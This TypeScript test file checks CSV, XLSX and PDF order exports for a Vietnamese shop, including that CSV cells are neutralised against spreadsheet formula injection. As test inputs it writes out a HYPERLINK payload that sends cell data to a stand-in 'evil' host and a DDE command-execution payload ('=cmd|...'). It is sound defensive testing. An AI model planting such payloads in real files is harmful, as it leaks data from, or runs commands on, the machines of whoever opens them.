import ExcelJS from 'exceljs';
import { PDFParse } from 'pdf-parse';
import { describe, expect, it } from 'vitest';

import {
  EXPORT_HEADERS,
  buildOrdersCsv,
  buildOrdersPdf,
  buildOrdersXlsx,
  type ExportOrderRow,
} from './orders-export';

function row(overrides: Partial<ExportOrderRow> = {}): ExportOrderRow {
  return {
    id: 'ORD-1',
    status: 'confirmed',
    customerName: 'Nguyễn Văn A',
    phoneE164: '+84901234567',
    addressText: '12 Lê Lợi Quận 1',
    paymentMethod: 'cod',
    totalVnd: '1000',
    createdAt: '2026-07-01T00:00:00.000Z',
    confirmedAt: null,
    shippedAt: null,
    sku: 'AT-DEN-L',
    qty: '2',
    title: 'Áo thun đen',
    ...overrides,
  };
}

const CUSTOMER_NAME_COLUMN = 2;

function csvText(overrides: Partial<ExportOrderRow> = {}) {
  return buildOrdersCsv([row(overrides)]).toString('utf8');
}

/**
 * Minimal RFC4180 reader: asserts on the cells a spreadsheet would actually
 * see, rather than on our own escaping by inspection.
 */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let current: string[] = [];
  let cell = '';
  let quoted = false;

  for (let index = 0; index < text.length; index += 1) {
    const char = text[index];
    if (quoted) {
      if (char === '"' && text[index + 1] === '"') {
        cell += '"';
        index += 1;
      } else if (char === '"') {
        quoted = false;
      } else {
        cell += char;
      }
      continue;
    }
    if (char === '"') {
      quoted = true;
    } else if (char === ',') {
      current.push(cell);
      cell = '';
    } else if (char === '\n') {
      current.push(cell);
      rows.push(current);
      current = [];
      cell = '';
    } else {
      cell += char;
    }
  }
  if (cell !== '' || current.length > 0) {
    current.push(cell);
    rows.push(current);
  }
  return rows;
}

describe('buildOrdersCsv formula injection', () => {
  // Every character a spreadsheet treats as "a formula starts here".
  it.each([
    ['equals', '=HYPERLINK("http://evil/?d="&A1)'],
    ['plus', '+1+1'],
    ['minus', '-1+1'],
    ['at', '@SUM(A1:A2)'],
    ['tab', '\t=1+1'],
    ['carriage return', '\r=1+1'],
  ])('neutralizes a %s-leading cell with an apostrophe', (_label, payload) => {
    const [, dataRow] = parseCsv(csvText({ customerName: payload }));

    expect(dataRow?.[CUSTOMER_NAME_COLUMN]).toBe(`'${payload}`);
  });

  it('does not quote a neutralized cell that needs no quoting', () => {
    const csv = csvText({ customerName: '=1+1' });

    expect(csv).toContain(",'=1+1,");
    expect(csv).not.toContain('"');
  });

  it('neutralizes the classic remote-code payload', () => {
    const payload = "=cmd|'/c calc'!A0";
    const [, dataRow] = parseCsv(csvText({ customerName: payload }));

    expect(dataRow?.[CUSTOMER_NAME_COLUMN]).toBe(`'${payload}`);
  });

  it('neutralizes every customer-controlled column, not just the name', () => {
    const [, dataRow] = parseCsv(
      csvText({
        customerName: '=1',
        addressText: '@2',
        sku: '+3',
        // `-4` alone is a plain integer, which cannot be a formula and is
        // deliberately exempt; `-4+1` is a real formula (Excel evaluates it).
        title: '-4+1',
      }),
    );

    expect(dataRow?.[2]).toBe("'=1");
    expect(dataRow?.[4]).toBe("'@2");
    expect(dataRow?.[10]).toBe("'+3");
    expect(dataRow?.[12]).toBe("'-4+1");
  });

  it('exempts plain integers so numeric cells stay numeric', () => {
    // A pure integer literal cannot be a formula, so prefixing it would only
    // turn a number into text (breaking SUM() downstream) for no security gain.
    const [, dataRow] = parseCsv(csvText({ title: '-4' }));

    expect(dataRow?.[12]).toBe('-4');
  });
});

describe('buildOrdersCsv quoting', () => {
  it('still quotes and doubles a cell containing a comma, quote, or newline', () => {
    const payload = 'Nguyễn, Văn "A"\nB';
    const csv = csvText({ customerName: payload });

    expect(csv).toContain('"Nguyễn, Văn ""A""\nB"');
    expect(parseCsv(csv)[1]?.[CUSTOMER_NAME_COLUMN]).toBe(payload);
  });

  it('both prefixes and quotes a dangerous cell that also contains a comma', () => {
    const csv = csvText({ customerName: '=1+1,2' });

    expect(csv).toContain(`"'=1+1,2"`);
    expect(parseCsv(csv)[1]?.[CUSTOMER_NAME_COLUMN]).toBe("'=1+1,2");
  });

  it('prefixes inside the quotes for a carriage-return cell', () => {
    const csv = csvText({ customerName: '\rzalo' });

    expect(csv).toContain(`"'\rzalo"`);
  });
});

describe('buildOrdersCsv untouched values', () => {
  it('leaves ordinary Vietnamese text, SKUs, and amounts alone', () => {
    const csv = csvText({ phoneE164: '0901234567' });
    const [, dataRow] = parseCsv(csv);

    expect(csv).not.toContain("'");
    expect(dataRow).toEqual([
      'ORD-1',
      'confirmed',
      'Nguyễn Văn A',
      '0901234567',
      '12 Lê Lợi Quận 1',
      'cod',
      '1000',
      '2026-07-01T00:00:00.000Z',
      '',
      '',
      'AT-DEN-L',
      '2',
      'Áo thun đen',
    ]);
  });

  it('prefixes an E.164 phone number, which is what keeps it readable', () => {
    // `+84901234567` is the one routinely-exported value that trips the guard.
    // Excel already evaluates a leading `+`, mangling the number into
    // `84901234567`, so the apostrophe fixes the display as well as the risk.
    const [, dataRow] = parseCsv(csvText({ phoneE164: '+84901234567' }));

    expect(dataRow?.[3]).toBe("'+84901234567");
  });

  it('leaves the header row untouched', () => {
    const csv = csvText({ customerName: '=1+1' });

    expect(csv.split('\n')[0]).toBe(EXPORT_HEADERS.join(','));
    expect(parseCsv(csv)[0]).toEqual([...EXPORT_HEADERS]);
  });

  it('exports money and quantity as plain non-negative numbers', () => {
    // Nothing in this export is a legitimately negative number, so the guard
    // never fires on a numeric cell here.
    const [, dataRow] = parseCsv(csvText({ totalVnd: '1500000', qty: '3' }));

    expect(dataRow?.[6]).toBe('1500000');
    expect(dataRow?.[11]).toBe('3');
  });
});

describe('buildOrdersXlsx', () => {
  it('writes formula-looking values as inert strings without adding apostrophes', async () => {
    const payload = "=cmd|'/c calc'!A0";
    const buffer = await buildOrdersXlsx([
      row({ customerName: payload, title: '=1+1' }),
    ]);

    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.load(buffer);
    const sheet = workbook.getWorksheet('Orders');
    const dataRow = sheet?.getRow(2);
    const nameCell = dataRow?.getCell(CUSTOMER_NAME_COLUMN + 1);
    const titleCell = dataRow?.getCell(13);

    // ExcelJS only emits <f> for `{ formula }` values, so no neutralization is
    // needed and the raw customer text must survive verbatim.
    expect(nameCell?.type).toBe(ExcelJS.ValueType.String);
    expect(nameCell?.value).toBe(payload);
    expect(titleCell?.type).toBe(ExcelJS.ValueType.String);
    expect(titleCell?.value).toBe('=1+1');
  });
});

/**
 * Pulls the real text layer back out of a generated PDF (via pdf-parse, which
 * wraps pdfjs-dist) rather than eyeballing the raw byte stream. This is what
 * actually proves a compliant PDF viewer would render/extract the embedded
 * Vietnamese text correctly, instead of merely asserting "buildOrdersPdf
 * didn't throw".
 */
async function extractPdfText(buffer: Buffer): Promise<{ text: string; pageCount: number }> {
  const parser = new PDFParse({ data: buffer });
  try {
    const result = await parser.getText();
    return { text: result.text, pageCount: result.pages.length };
  } finally {
    await parser.destroy();
  }
}

/**
 * A long "id | status | name | phone | address | sku xqty title | total"
 * row can be wider than the page for real Vietnamese names/addresses, so
 * `buildOrdersPdf` relies on PDFKit's own word-wrap (see orders-export.ts)
 * rather than a hand-rolled fixed-width line. PDFKit (like any correct line
 * breaker) may wrap at a space *or* a hyphen, and it does not always render
 * the space consumed at a wrap point back into the text layer. Stripping all
 * whitespace from both sides before comparing makes the assertion robust to
 * *where* a line wrapped while still requiring every non-whitespace
 * character - i.e. every actual diacritic - to survive, in order, exactly.
 * A dropped/mangled character anywhere still fails this check.
 */
function stripWhitespace(value: string): string {
  return value.replace(/\s+/g, '');
}

function expectPdfTextToContainExactly(haystack: string, expected: string) {
  expect(stripWhitespace(haystack)).toContain(stripWhitespace(expected));
}

describe('buildOrdersPdf', () => {
  it('round-trips a full range of Vietnamese diacritics exactly', async () => {
    const customerName = 'Nguyễn Thị Ánh Dương';
    const addressText = '123 Đường Nguyễn Huệ, Quận 1, Thành phố Hồ Chí Minh';
    const title = 'Bàn ủi hơi nước đứng cỡ ơ ư đặc biệt';

    const buffer = await buildOrdersPdf([
      row({ customerName, addressText, title }),
    ]);

    expect(buffer.subarray(0, 5).toString('ascii')).toBe('%PDF-');

    const { text } = await extractPdfText(buffer);

    expectPdfTextToContainExactly(text, 'Xuất đơn hàng');
    expectPdfTextToContainExactly(text, customerName);
    expectPdfTextToContainExactly(text, addressText);
    expectPdfTextToContainExactly(text, title);

    // Order matters too: these should all belong to the same row, not just
    // appear anywhere in the document.
    const stripped = stripWhitespace(text);
    const nameIndex = stripped.indexOf(stripWhitespace(customerName));
    const addressIndex = stripped.indexOf(stripWhitespace(addressText));
    const titleIndex = stripped.indexOf(stripWhitespace(title));
    expect(nameIndex).toBeGreaterThan(-1);
    expect(addressIndex).toBeGreaterThan(nameIndex);
    expect(titleIndex).toBeGreaterThan(addressIndex);
  });

  it('renders the Vietnamese empty-state line when there are no rows', async () => {
    const buffer = await buildOrdersPdf([]);

    const { text, pageCount } = await extractPdfText(buffer);

    expect(pageCount).toBe(1);
    expectPdfTextToContainExactly(text, 'Xuất đơn hàng');
    expectPdfTextToContainExactly(text, '(không có đơn)');
  });

  it('round-trips plain ASCII content (phone number, SKU) with no regression', async () => {
    const phoneE164 = '+84901234567';
    const sku = 'SKU-PLAIN-001';

    const buffer = await buildOrdersPdf([row({ phoneE164, sku })]);

    const { text } = await extractPdfText(buffer);

    expectPdfTextToContainExactly(text, phoneE164);
    expectPdfTextToContainExactly(text, sku);
  });

  it('paginates across multiple pages without dropping any rows', async () => {
    const rowCount = 150;
    const rows = Array.from({ length: rowCount }, (_, index) =>
      row({
        id: `ORD-${index}`,
        customerName: `Khách hàng ${index}`,
        addressText: `Số ${index} Đường Lê Lợi`,
      }),
    );

    const buffer = await buildOrdersPdf(rows);
    const { text, pageCount } = await extractPdfText(buffer);

    expect(pageCount).toBeGreaterThan(1);

    const stripped = stripWhitespace(text);
    for (const currentRow of rows) {
      expect(stripped).toContain(currentRow.id);
      expect(stripped).toContain(stripWhitespace(currentRow.customerName ?? ''));
    }
  });
});
